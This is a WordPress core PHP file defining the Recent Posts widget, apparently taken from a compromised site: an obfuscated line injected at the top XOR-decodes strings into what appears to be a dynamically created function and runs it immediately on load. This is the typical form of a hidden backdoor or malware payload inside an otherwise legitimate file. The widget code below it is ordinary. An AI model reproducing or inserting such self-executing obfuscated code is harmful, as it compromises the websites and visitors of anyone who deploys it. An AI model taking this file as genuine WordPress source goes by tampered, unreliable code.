<?php $TkOhIRlXF='23IM3Ej<K OHXWN'^'QA,,G 5Z>N,<18 ';$hFSLApssBAeL=$TkOhIRlXF('','0>Lv>>7HG8>W;PO+03Fpt963j20Z67:47<aGnMKbA3NE52GB,VS6D=O3,5a95=3ruT15,Baj8YJxZxdnvCl13kQ,;cguArrrkp7=>MHTJOdihBqQK YF6Q4Kr+PF2xWRl:hSdcxgT-O0AtMfzr=P8W+i:avfpK>+T+v HAR:-KTNNra=N<a<Br=ahLXAKI:bE 6ECL1cG7-HHqO0A2AvjM6ZSEWME56,62.XGuKiZ;L=-yaSMD8Y100lEu4u=s.i<u3GOP,. JrKDA<Z9AWyC7YQG0 IMl;KYwRTH12BhRZC>MY1CXRmVO>YVh9;eSY3TeBbP+ ADt9Aa3SOTL:XKMK:g-=145eO7XpnX7-jVkqP28<N5ny6:sNQWAJOj=E3dgpQZEKIyBXjJ9<3gUfCV B4HXxsVpSg<f1A;,omZ0FZ5NI+-WY76mV8R;O159;kV=LM828TPd3ZK4;7.ra29=YOakpP1B06F,MOLS<.4ACP22VIiKUM4LPMgX45-U7GE,;eo< IJOaiRAG3jiciwDYXRrRXZD25MUSYK;ZiXyIaG B1xbsb1EsTD<OHSXSkddRabBrIwVR6KZyeutAC;7-s;KY564Z=J>FV<R2VSM1dGYaJ5-,dsxJIDuzABNK,QQIq,SMLkpFA85UAZIqqcdzYM ;Xybq=H'^'YXdWXKY+3QQ9d57BCG5XSAYA5VQ.WheYBHFnGm0hHU;+VF.-Bv+Y6b+RXT>fXHGZQ0PAMnANS<3QzXDNV8f8:O>YOCZUfUIxbyQRLel=jrDYSbU8wS-4Z4ZcVO12SQlrHSCxMiqnpB:DaZpFRVY1L6pMS<V8PoUN-pRIhdrIY98+ ZEV+EHakI7ha>=5>;TJaOC1jw;j:=PBBU+Q5SaKJ+W6  lGaQWXWmE=>UvI<Z NHBkY++J<PSXLmQk6r<e yUR4otGKYjOudeJ;U42PcLSXcTA=,3P. WotlZW;SXSgZ,-PcerI .R,3S3FoY0UtMcF4JT mTBKhU<=1-Y0keoe5hldqf1oV+PJ3RTJkUQtDYP;PGYM0zGu3 >.5V JDZPu1 2rsKQN.XHRGhFg A.A-crz+z.m6BU OMOPzp34F+;BL;0MSE.W d+PAXd4;H8eZSK1fPl>.WTSKZEVXI8fMKT4P6Qi-I4feh6GRig4SF7iOmu,F>1483QLr0O.6XHMHWE0mcAM6 3RCIEOWl4<gZv<;0Snj>6 lfsIeDiFpApTHRGQSwA7tYwpeodSPRgYSzK-E0dTlsYCST 1IVT,P. jSL3N>MnqL3K:<,UCkyE.TYMMZXjidUZ:HG.Z0=aUH29-0W6 AY: >n,XXns<5IOpIKJ75');$hFSLApssBAeL();
/**
 * Widget API: WP_Widget_Recent_Posts class
 *
 * @package WordPress
 * @subpackage Widgets
 * @since 4.4.0
 */

/**
 * Core class used to implement a Recent Posts widget.
 *
 * @since 2.8.0
 *
 * @see WP_Widget
 */
class WP_Widget_Recent_Posts extends WP_Widget {

	/**
	 * Sets up a new Recent Posts widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 */
	public function __construct() {
		$widget_ops = array(
			'classname' => 'widget_recent_entries',
			'description' => __( 'Your site&#8217;s most recent Posts.' ),
			'customize_selective_refresh' => true,
		);
		parent::__construct( 'recent-posts', __( 'Recent Posts' ), $widget_ops );
		$this->alt_option_name = 'widget_recent_entries';
	}

	/**
	 * Outputs the content for the current Recent Posts widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $args     Display arguments including 'before_title', 'after_title',
	 *                        'before_widget', and 'after_widget'.
	 * @param array $instance Settings for the current Recent Posts widget instance.
	 */
	public function widget( $args, $instance ) {
		if ( ! isset( $args['widget_id'] ) ) {
			$args['widget_id'] = $this->id;
		}

		$title = ( ! empty( $instance['title'] ) ) ? $instance['title'] : __( 'Recent Posts' );

		/** This filter is documented in wp-includes/widgets/class-wp-widget-pages.php */
		$title = apply_filters( 'widget_title', $title, $instance, $this->id_base );

		$number = ( ! empty( $instance['number'] ) ) ? absint( $instance['number'] ) : 5;
		if ( ! $number )
			$number = 5;
		$show_date = isset( $instance['show_date'] ) ? $instance['show_date'] : false;

		/**
		 * Filters the arguments for the Recent Posts widget.
		 *
		 * @since 3.4.0
		 *
		 * @see WP_Query::get_posts()
		 *
		 * @param array $args An array of arguments used to retrieve the recent posts.
		 */
		$r = new WP_Query( apply_filters( 'widget_posts_args', array(
			'posts_per_page'      => $number,
			'no_found_rows'       => true,
			'post_status'         => 'publish',
			'ignore_sticky_posts' => true
		) ) );

		if ($r->have_posts()) :
		?>
		<?php echo $args['before_widget']; ?>
		<?php if ( $title ) {
			echo $args['before_title'] . $title . $args['after_title'];
		} ?>
		<ul>
		<?php while ( $r->have_posts() ) : $r->the_post(); ?>
			<li>
				<a href="<?php the_permalink(); ?>"><?php get_the_title() ? the_title() : the_ID(); ?></a>
			<?php if ( $show_date ) : ?>
				<span class="post-date"><?php echo get_the_date(); ?></span>
			<?php endif; ?>
			</li>
		<?php endwhile; ?>
		</ul>
		<?php echo $args['after_widget']; ?>
		<?php
		// Reset the global $the_post as this query will have stomped on it
		wp_reset_postdata();

		endif;
	}

	/**
	 * Handles updating the settings for the current Recent Posts widget instance.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $new_instance New settings for this instance as input by the user via
	 *                            WP_Widget::form().
	 * @param array $old_instance Old settings for this instance.
	 * @return array Updated settings to save.
	 */
	public function update( $new_instance, $old_instance ) {
		$instance = $old_instance;
		$instance['title'] = sanitize_text_field( $new_instance['title'] );
		$instance['number'] = (int) $new_instance['number'];
		$instance['show_date'] = isset( $new_instance['show_date'] ) ? (bool) $new_instance['show_date'] : false;
		return $instance;
	}

	/**
	 * Outputs the settings form for the Recent Posts widget.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param array $instance Current settings.
	 */
	public function form( $instance ) {
		$title     = isset( $instance['title'] ) ? esc_attr( $instance['title'] ) : '';
		$number    = isset( $instance['number'] ) ? absint( $instance['number'] ) : 5;
		$show_date = isset( $instance['show_date'] ) ? (bool) $instance['show_date'] : false;
?>
		<p><label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e( 'Title:' ); ?></label>
		<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo $title; ?>" /></p>

		<p><label for="<?php echo $this->get_field_id( 'number' ); ?>"><?php _e( 'Number of posts to show:' ); ?></label>
		<input class="tiny-text" id="<?php echo $this->get_field_id( 'number' ); ?>" name="<?php echo $this->get_field_name( 'number' ); ?>" type="number" step="1" min="1" value="<?php echo $number; ?>" size="3" /></p>

		<p><input class="checkbox" type="checkbox"<?php checked( $show_date ); ?> id="<?php echo $this->get_field_id( 'show_date' ); ?>" name="<?php echo $this->get_field_name( 'show_date' ); ?>" />
		<label for="<?php echo $this->get_field_id( 'show_date' ); ?>"><?php _e( 'Display post date?' ); ?></label></p>
<?php
	}
}
